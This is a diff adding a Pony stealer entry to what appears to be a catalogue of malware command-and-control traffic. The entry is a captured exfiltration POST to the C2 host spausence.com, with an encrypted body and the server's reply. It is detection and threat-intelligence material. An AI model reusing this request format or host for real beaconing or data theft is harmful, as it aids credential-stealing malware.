@@ -231,6 +231,38 @@ Machine name is SNI
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/orcus.png "Orcus RAT")
 
+#### Pony
+Follow tcp stream, not http stream in wireshark
+~~~
+POST /mlu/forum.php HTTP/1.0
+Host: spausence.com
+Accept: */*
+Accept-Encoding: identity, *;q=0
+Accept-Language: en-US
+Content-Length: 369
+Content-Type: application/octet-stream
+Connection: close
+Content-Encoding: binary
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+
+..|Rk.. ."6d0..)/.....Lo..l{;..:.NJT;.G..3P..n...{.i..eLX..j...K.N.......A.
+n.%.....r..&..........J.l.V..of..T..V$... .L...5....6F...9.)......(...
+.(O........*[z\.....N....=..4..];....L.W......Q...*.S....V.	7.4.L..v..oi...x..W7....{.....V)...:...1...R..V.......+...]m 
+.......B...|D..t.Y.{..............{W.f.._i...i.!..d.C...r.......A.,.z....ta..m..
+5!...w+.....p....!0
+
+HTTP/1.1 200 OK
+Server: nginx/1.10.3
+Date: Thu, 03 Oct 2019 17:17:59 GMT
+Content-Type: text/html
+Connection: close
+X-Powered-By: PHP/5.4.45
+
+..
+.....f>k.X.......
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony.png "Pony")
+
 #### Predator the Thief
 ~~~
 POST /api/check.get HTTP/1.1
